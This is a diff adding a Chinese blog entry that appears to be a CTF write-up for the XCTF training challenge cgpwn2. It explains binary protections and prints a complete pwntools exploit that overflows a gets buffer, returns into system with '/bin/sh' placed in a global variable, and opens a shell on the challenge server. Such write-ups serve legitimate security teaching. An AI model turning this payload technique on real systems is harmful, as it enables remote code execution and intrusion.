@@ -246,6 +246,56 @@
       </tags>
   </entry>
   <entry>
+    <title>攻防世界—cgpwn2</title>
+    <url>/SQLInject/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94cgpwn2/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
+<p>开始学习PWN！</p>
+</blockquote>
+<p><a href="https://sm.ms/image/R8OLfEr5MJbeCj1" target="_blank"><img src="https://s2.loli.net/2022/02/28/R8OLfEr5MJbeCj1.png" ></a></p>
+<span id="more"></span>
+
+<p>对附件做一个分析</p>
+<p><a href="https://sm.ms/image/ObgNJHGj7dABXrk" target="_blank"><img src="https://s2.loli.net/2022/02/28/ObgNJHGj7dABXrk.png" ></a></p>
+<p>32位程序</p>
+<h1 id="防护机制"><a href="#防护机制" class="headerlink" title="防护机制"></a>防护机制</h1><h4 id="ASLR-Address-space-layout-randomization，地址空间布局随机化"><a href="#ASLR-Address-space-layout-randomization，地址空间布局随机化" class="headerlink" title="ASLR (Address space layout randomization，地址空间布局随机化)"></a>ASLR (Address space layout randomization，地址空间布局随机化)</h4><p>在windows上ASLR主要包括<code>堆栈随机化</code>、<code>PEB</code>（Process Envirorment Block Structure进程环境信息块）与<code>TEB</code>（线程环境快）、<code>映像随机化</code>,windows系统从vista开始ASLR才真正发挥作用。  </p>
+<p>在linux上ASLR主要包括<code>栈地址随机化</code>、<code>LIBS/MMAP随机化、EXEC随机化、BRK随机化、VDSO随机化</code>。在没有ASLR的情况下让程序跳转到一个已经存在的系统函数的漏洞利用方式被称为<code>ret2libc</code>。  </p>
+<p>在linux系统中<code>ASLR被分为0，1，2三个等级</code>，可以通过<code>sudo bash -c &quot;echo 2 &gt; /proc/sys/kernel/randomize_va_space&quot;设置</code>。<br>0：没有随机化。即关闭ASLR。<br>1：保留的随机化。共享库、栈、mmap()分配的内存空间以及VDSO将被随机化。<br>2：完全的随机化。在1的基础上，通过 brk()分配的内存空间也将被随机化。</p>
+<h4 id="NX-Non-Executable-Memory，不可执行内存"><a href="#NX-Non-Executable-Memory，不可执行内存" class="headerlink" title="NX(Non-Executable Memory，不可执行内存)"></a>NX(Non-Executable Memory，不可执行内存)</h4><p>类似于DEP，数据执行保护。</p>
+<h4 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h4><p>PIE只有在系统开启ASLR和编译时开启-fpie-pie选项这两个条件同时满足时才会生效。</p>
+<h4 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h4><p>RELRO(RELocation Read-Only，只读重定位)让加载器将重定位表中加载时解析的符号标记为只读，这减少了GOT覆写攻击的面积。RELRO可以分为Partial RELRO(部分RELRO)和Full RELRO(完整RELRO)。开启Partial RELRO的话GOT表是可写的；开启FULL RELRO的话GOT表是只读的。</p>
+<h4 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h4><p>Stack Protector又名canary，stack cookie……等等，类似于VS编译器中的GS。</p>
+<h1 id="用32位IDA打开附件"><a href="#用32位IDA打开附件" class="headerlink" title="用32位IDA打开附件"></a>用32位IDA打开附件</h1><p>pwn函数中的system无法利用。</p>
+<p><a href="https://sm.ms/image/6sugNihR7LEOBIw" target="_blank"><img src="https://s2.loli.net/2022/02/28/6sugNihR7LEOBIw.png" ></a></p>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>shift+f12查找字符串并没有发现&#x2F;bin&#x2F;sh，可能需要自己整，或者藏在某个变量里。</p>
+<p>在函数列表里找到了真正的_system，括号内的command似乎是输入，这里插留坑。地址是<code>0x804A0C8</code></p>
+<p>要自己构建执行命令，有个条件：</p>
+<p>要求执行的命令在一个固定的地址上，且可以读取写入。</p>
+<p>题中第一个输入的变量存在name中，<strong>而name标蓝代表全局变量</strong>。</p>
+<ul>
+<li>name再<code>.bss</code>段上，还未初始化，但地址也是固定的</li>
+<li>name前可以看到这一部分的.bss段<code>具有可读写属性</code></li>
+</ul>
+<p><a href="https://sm.ms/image/rdTVhklRN15QwIF" target="_blank"><img src="https://s2.loli.net/2022/02/28/rdTVhklRN15QwIF.png" ></a></p>
+<p>由此构建EXP</p>
+<p>利用第一个输入，写我们想要执行的命令，eg： &#x2F;bin&#x2F;sh</p>
+<p>利用第二个输入的gets进行栈溢出，拼接出 system &#x2F;bin&#x2F;sh：</p>
+<ul>
+<li>先将字符串s填满在把s的栈地址填满，将返回地址改成system地址</li>
+<li>再填四字节无用地址堵住system的返回地址，至于为什么要用四，是因为他的长度为四</li>
+<li>然后缝合上之前输入的&#x2F;bin&#x2F;sh的地址<br>python3中需要把所有都转化为字节<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">b&#x27;111.200.241.244&#x27;</span>,<span class="number">63983</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn006&quot;)</span></span><br><span class="line">binsh = <span class="string">b&quot;/bin/sh&quot;</span></span><br><span class="line">system = <span class="number">0x8048420</span></span><br><span class="line"></span><br><span class="line">name = <span class="number">0x804A080</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x26</span> + <span class="string">b&quot;B&quot;</span>*<span class="number">0x4</span> + p32(system) + p32(<span class="number">0</span>) + p32(name)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;please tell me your name&quot;</span>,binsh)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;hello,you can leave some message here:&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><a href="https://sm.ms/image/fywlnB781SquvsM" target="_blank"><img src="https://s2.loli.net/2022/02/28/fywlnB781SquvsM.png" ></a></p>
+<p>如果用<code>/bin/sh</code> 要在Linux下，因为目标主机是Linux的</p>
+<p><a href="https://sm.ms/image/td73KY4RrbgqfFD" target="_blank"><img src="https://s2.loli.net/2022/02/28/td73KY4RrbgqfFD.png" ></a></p>
+]]></content>
+      <categories>
+        <category>二进制安全</category>
+      </categories>
+      <tags>
+        <tag>PWN,WP</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>多进程、进程池、异步大总结</title>
     <url>/%E7%9F%A5%E8%AF%86%E6%A0%91/%E5%A4%9A%E8%BF%9B%E7%A8%8B%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%BC%82%E6%AD%A5/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><center>前言</center></h1><p>经常写脚本与工具，越发感觉到速度的重要性！本文从基础开始，基于Python讲解，适合小白阅读，但需要一定代码功底。</p>
